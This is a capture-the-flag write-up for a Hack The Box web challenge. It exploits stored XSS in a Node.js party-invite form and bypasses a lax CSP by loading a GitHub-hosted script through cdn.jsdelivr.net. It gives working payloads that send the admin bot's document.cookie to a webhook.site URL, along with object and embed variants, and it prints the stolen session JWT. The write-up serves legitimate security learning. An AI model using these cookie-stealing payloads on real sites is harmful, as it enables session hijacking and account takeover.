# Cursed Secret Party

Difficulty:: #medium


---
## Disclaimer ⚠️

**I DID NOT SOLVE THIS CHALLENGE DURING THE CTF**, I took the guide from [Fanky's website writeup](https://blog.fanky.me/ctf_writeups/hacktheboo_cursed_secret_party/) to solve it in the after event. Thank you Fanky.

---

## Introduction
The box is a nodejs app where you can send a data form that will be review by the admin user (simulated by a bot) Due to not sanitize the username input, it can perform a XSS stored attack. But its necesary Bypass a CSP that is not well configured and allow scripts from [cdn.jsdelivr.net](cdn.jsdelivr.net) domain. With that is possible steal the admin cookie session, where we can find the flag.

> Similar to [Acnologia portal challenge](https://www.hackthebox.com/blog/acnologia-portal-ca-ctf-2022-web-writeup#challenge_unintendeds)  with have a xss stored attack. But with the diference that this have the [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) wich limits the attack.

## Target data
- `Spawn Docker`: `159.65.49.148:32704` 
- `Source Code`: `web_cursed_party.zip`

## Challenge Description
*You've just received an invitation to a party. Authorities have reported that the party is cursed, and the guests are trapped in a never-ending unsolvable murder mystery party. Can you investigate further and try to save everyone?*

## Enumeration
```
http://159.65.49.148:32704/
```
![5-index.png](./static/5-index.png)

First download the source code and identify a nodejs app where endpoinst can be located in `web_cursed_party/challenge/routes/index.js`

```shell
magor$ tree web_cursed_party
web_cursed_party
├── Dockerfile
├── build-docker.sh
├── challenge
│   ├── bot.js
│   ├── database.js
│   ├── helpers
│   │   └── JWTHelper.js
│   ├── index.js
│   ├── middleware
│   │   └── AuthMiddleware.js
│   ├── package.json
│   ├── routes
│   │   └── index.js
│   ├── static
│   │   ├── css
│   │   │   ├── bootstrap.min.css
│   │   │   └── index.css
│   │   └── js
│   │       └── login.js
│   ├── test.html
│   └── views
│       ├── admin.html
│       └── index.html
├── config
│   └── supervisord.conf
└── flag.txt
```

Only there are 3 endpoints:

- `/api/submit`
- `/admin`
- `/admin/delete_all`

The only one wich we can interact is `/api/submit` because of the other two required to have `admin` role. So look whats the `/api/submit` do:

```js
// web_cursed_party/challenge/routes/index.js
// ...SNIP...
router.post('/api/submit', (req, res) => {
    const { halloween_name, email, costume_type, trick_or_treat } = req.body;

 ➊  if (halloween_name && email && costume_type && trick_or_treat) {

     ➋  return db.party_request_add(halloween_name, email, costume_type, trick_or_treat)
            .then(() => {
                res.send(response('Your request will be reviewed by our team!'));

             ➌  bot.visit();
            })
            .catch(() => res.send(response('Something Went Wrong!')));
    }

    return res.status(401).send(response('Please fill out all the required fields!'));
});
// ...SNIP...
```

It sends the data in the form and check that all parameters are in the body request ➊, after that, execute a method of the `Database` ➋ , and if it succesful, then it call a bot ➌ so here we can suspect athe posibility of a XSS attack.

> There are vulnerabilities that require other user interaction to exploit them, in this case it seems that the `admin` interaction will be simulated. Ussually in CTF the will simulate other user interaction with a bot.

But first check the database method ➋ in the f `web_cursed_party/challenge/database.js` file.

```js
// web_cursed_party/challenge/database.js
// ...SNIP...
	async party_request_add(halloween_name, email, costume_type, trick_or_treat) {
		return new Promise(async (resolve, reject) => {
			try {
		➊		let stmt = await this.db.prepare('INSERT INTO party_requests (halloween_name, email, costume_type, trick_or_treat) VALUES (?, ?, ?, ?)');
				resolve((await stmt.run(halloween_name, email, costume_type, trick_or_treat)));
			} catch(e) {
				reject(e);
			}
		});
	}
// ...SNIP...
```

The `party_request_add()` method execute a SQL INSERT statement with add all user input data into the `party_requests` table ➊. Notice that the query is parameterized, so there is no chance to SQL injection. 


Now review the `bot.visit()` function inside  `web_cursed_party/challenge/bot.js`

### Bot
There is only one function inside `bot.js` file. and note that it uses [puppeteer](https://pptr.dev/) wich is a nodejs library that can control Chrome/Chromium like if were done manually.
```js
// web_cursed_party/challenge/bot.js
// ...SNIP...
const visit = async () => {
    try {
	➊	const browser = await puppeteer.launch(browser_options);
		let context = await browser.createIncognitoBrowserContext();
		let page = await context.newPage();

	➋	let token = await JWTHelper.sign({ username: 'admin', user_role: 'admin', flag: flag });
		await page.setCookie({
			name: 'session',
			value: token,
			domain: '127.0.0.1:1337'
		});

	➌	await page.goto('http://127.0.0.1:1337/admin', {
			waitUntil: 'networkidle2',
			timeout: 5000
		});

	➍	await page.goto('http://127.0.0.1:1337/admin/delete_all', {
			waitUntil: 'networkidle2',
			timeout: 5000
		});

		setTimeout(() => {
			browser.close();
		}, 5000);

    } catch(e) {
        console.log(e);
    }
};
// ...SNIP...
```

First it initalizate configuration of the browser ➊, and it creates a session cookie with a JWT token ➋. **Note that inside the JWT payload is the FLAG**, so this challenge is crying out for stole the admin cookie session. After that it goes to two admin endpoinst ➌ and ➍. So I return to the `routes/index.js` endpoinst to check what the admin bot is doing.

```js
// web_cursed_party/challenge/routes/index.js
// ...SNIP...
router.get('/admin', AuthMiddleware, (req, res) => {
    if (req.user.user_role !== 'admin') {
        return res.status(401).send(response('Unautorized!'));
    }

 ➊   return db.get_party_requests()
        .then((data) => {
            res.render('admin.html', { requests: data });
        });
});

router.get('/admin/delete_all', AuthMiddleware, (req, res) => {
    if (req.user.user_role !== 'admin') {
        return res.status(401).send(response('Unautorized!'));
    }
    
 ➋  return db.remove_requests()
            .then(() => res.send(response('All records are deleted!')));
})
// ...SNIP...
```

The first one, `/admin` endpoint, retrieve data from the database ➊ and render in the `admin.html` templates. On the other hand, the `/admin/delete_all` only delete thata from the database ➋. So, now check those database methods.

```js
// web_cursed_party/challenge/database.js
// ...SNIP...
	async get_party_requests(){
		return new Promise(async (resolve, reject) => {
			try {
		➊	let stmt = await this.db.prepare('SELECT * FROM party_requests');
				resolve(await stmt.all());
			} catch(e) {
				reject(e);
			}
		});
	}

	async remove_requests(){
		return new Promise(async (resolve, reject) => {
			try {
				let stmt = await this.db.prepare('DELETE FROM party_requests');
				resolve(await stmt.run());
			} catch(e) {

			}
		})
	}
// ...SNIP...
```

The `get_party_requests()` method, only fetch all records inside the `party_requests`  ➊	(in that table is where our input data is stored). So we can conclude that all we send in the form will be render in the `admin.html` view.  And  the `remove_requests()` delete all records in the same table (maybe to clean).


So what we have until now:

>An user input form where we can send any data we want and it will be render in the `admin.html` template that the bot will be render after we send the requests. After that the data we send will be delete.

So If we expect execute a XSS attack, we need to check the `admin.html` and expect that at least one of the input parameters dont be sanitaze. 

```html
// web_cursed_party/challenge/views/admin.html
// ...SNIP...
                <div class="card-header"> <strong>Halloween Name</strong> : {{ request.halloween_name | safe }}➊ </div>
                <div class="card-body">
                    <p class="card-title"><strong>Email Address</strong>    : {{ request.email }}</p>
                    <p class="card-text"><strong>Costume Type </strong>   : {{ request.costume_type }} </p>
                    <p class="card-text"><strong>Prefers tricks or treat </strong>   : {{ request.trick_or_treat }} </p>
// ...SNIP...      
```
And look at the `hallowen_name`  parameter ➊ , it use the `| safe` filter. That filter says to the engine that the input is safe and dont need to be sanitize. so we have a XSS stored attack.


So to test the XSS payload I use the [webhooh.site](https://webhook.site/) and send the basic payload:

```html
<img src=x onerror="https://webhook.site/2bbcc730-4932-43ed-a209-a85203091910">
```

or this:

```html
<script>new Image().src="https://webhook.site/2bbcc730-4932-43ed-a209-a85203091910";</script>
```

But it does not work, so I recheck the configuration and note that I missed something important in the `web_cursed_party/challenge/index.js` file:
```js
// web_cursed_party/challenge/index.js
// ...SNIP...
app.use(function (req, res, next) {
    res.setHeader(
        "Content-Security-Policy",
        "script-src 'self' https://cdn.jsdelivr.net ; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; child-src 'self'; frame-src 'self'; worker-src 'self'; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; manifest-src 'self'"
    );
    next();
});
// ...SNIP...
```

The [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) is enabled, and it focus to mitigate XSS attacks, so only allow requests to trusted sources. 

But maybe the CSP is misconfigured so i check [CSP bypass in PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#csp-bypass) and check in the [google csp evaluator](https://csp-evaluator.withgoogle.com/) and here we can paste the url or the CSP policy to get a review of the security issues about it.

![5-csp-evaluator.png](./static/5-csp-evaluator.png)
I got that there is a risk with `script-src` , it says: *cdn.jsdelivr.net is known to host JSONP endpoints and Angular libraries which allow to bypass this CSP.*

>I also read a [writeup with a  bypass CSP](https://cybermouflons.com/RED-CSAW19-NevernoteCSP/) to understand how it works. 

So I go to the [cdn.jsdelivr.net](cdn.jsdelivr.net) page

### cdn.jsdelivr.net
When I go to [cdn.jsdelivr.net](cdn.jsdelivr.net)  it redirects me to [www.jsdelivr.com](www.jsdelivr.com).
```
https://www.jsdelivr.com/?docs=gh
```
![5-cdn.png](./static/5-cdn.png)

When I read the examples in the main page i get that I can load any file from sources like npm , github or wordpress. It seems that it links them to create the redirections


At this point i try to find a `jsonp` endpoint that allow me to redirects the requests to my webhook, or using the `jsdelivr` to import angular library and try to execute a requests. But all was more easy than i expected, but i couldn't figuret out.

But, in the after event I could try another things after read the [fanky's writeup](https://blog.fanky.me/ctf_writeups/hacktheboo_cursed_secret_party).

## Foothold

First create a file in one of your github repostiories with the following payload, I called `xss_test1.js`

```js
// xss_test1.js
fetch('https://webhook.site/2bbcc730-4932-43ed-a209-a85203091910')
```

After that go to [Migrating from GitHub to jsDelivr](https://www.jsdelivr.com/github) paste  the github file link :
![5-jsdelivr-github.png](./static/5-jsdelivr-github.png)

if I go to https://cdn.jsdelivr.net/gh/xmagor/test@main/xss_test1.js, i see the same file that i write
> Note that after do it the challenge i delete that repostiorie, so the link already doesn't work

The docs says that in production is not necesary to use `@main` (refer to a git branch) so i only use https://cdn.jsdelivr.net/gh/xmagor/test/xss_test1.js in a `<script>` tag.

Payload:
```
<script src="https://cdn.jsdelivr.net/gh/xmagor/test/xss_test1.js "></script>
```

Write it in the `Hallowin name` field, and send it
![5-index-payload.png](./static/5-index-payload.png)

Now check the webhook.site and verify that the request was done! from the server localhost:
![5-webhook.png](./static/5-webhook.png)
> To do this type of blind test, its a good practice run the docker locally and test it there, because in this case there is no feedback in the web page, and if the request fails, we cant figuret out why fails. 

Now base on [xss injection in PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)  I found that we can grab the cookie from `document.cookie`. So I modify the payload in the github repositorie. with

```js
// xss_test2.js
fetch('https://webhook.site/2bbcc730-4932-43ed-a209-a85203091910/?c=' + document.cookie)
```

And add it to the `<script>` tag
```
<script src="https://cdn.jsdelivr.net/gh/xmagor/test/xss_test2.js "></script>
```
![5-index-attack.png](./static/5-index-attack.png)
And check the webhook.site and see the cookie session!:
![5-webhook-cookie.png](./static/5-webhook-cookie.png)


```
session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl9yb2xlIjoiYWRtaW4iLCJmbGFnIjoiSFRCe2Nkbl9jNG5fYnlwNHNzX2M1cCEhfSIsImlhdCI6MTY2NzE1NTMxOX0.y9w4oIvFOm5-QKJoc8zDtHtS78hu2wJOvGIVz9d_uec
```

And use the jwt.io to decode it:
![5-jwt-decode.png](./static/5-jwt-decode.png)



## Notes
If I want to inside to admin page I could do it adding the cookie to the browser, i use [firefox cookie editor extension](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/) to do that.
![5-cookie-session.png](./static/5-cookie-session.png)

### First attemp
When I was trying to [bypass the CSP  using the object tag](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#bypass-csp-by-akita_zen)

Theese work on firefox but not on chrome (testing locally with the docker image):
```html
<object data="https://webhook.site/2bbcc730-4932-43ed-a209-a85203091910"></object>

<embed src="https://webhook.site/2bbcc730-4932-43ed-a209-a85203091910"></embed>


<object data="https://webhook.site/2bbcc730-4932-43ed-a209-a85203091910?cookie="+document.cookie></object>
```

